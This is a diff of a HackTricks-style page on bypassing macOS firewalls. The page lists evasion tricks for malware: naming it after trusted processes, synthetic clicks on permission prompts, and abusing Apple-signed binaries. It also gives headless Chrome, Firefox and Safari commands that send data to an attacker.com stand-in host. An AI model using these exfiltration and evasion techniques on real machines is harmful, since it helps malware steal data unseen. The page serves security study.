@@ -1,6 +1,6 @@
 # macOS Bypassing Firewalls
 
-{{#include ../../banners/hacktricks-training.md}}
+\{{#include ../../banners/hacktricks-training.md\}}
 
 ## Found techniques
 
@@ -8,15 +8,15 @@ The following techniques were found working in some macOS firewall apps.
 
 ### Abusing whitelist names
 
-- For example calling the malware with names of well known macOS processes like **`launchd`**
+* For example calling the malware with names of well known macOS processes like **`launchd`**
 
 ### Synthetic Click
 
-- If the firewall ask for permission to the user make the malware **click on allow**
+* If the firewall ask for permission to the user make the malware **click on allow**
 
 ### **Use Apple signed binaries**
 
-- Like **`curl`**, but also others like **`whois`**
+* Like **`curl`**, but also others like **`whois`**
 
 ### Well known apple domains
 
@@ -42,7 +42,7 @@ DNS resolutions are done via **`mdnsreponder`** signed application which will pr
 
 ### Via Browser apps
 
-- **oascript**
+* **oascript**
 
 ```applescript
 tell application "Safari"
@@ -53,19 +53,19 @@ tell application "Safari"
 end tell
 ```
 
-- Google Chrome
+* Google Chrome
 
 ```bash
 "Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
 ```
 
-- Firefox
+* Firefox
 
 ```bash
 firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
 ```
 
-- Safari
+* Safari
 
 ```bash
 open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
@@ -75,15 +75,12 @@ open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
 
 If you can **inject code into a process** that is allowed to connect to any server you could bypass the firewall protections:
 
-{{#ref}}
-macos-proces-abuse/
-{{#endref}}
+\{{#ref\}}\
+macos-proces-abuse/\
+\{{#endref\}}
 
 ## References
 
-- [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)
+* [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)
 
-{{#include ../../banners/hacktricks-training.md}}
-
-
-
+\{{#include ../../banners/hacktricks-training.md\}}
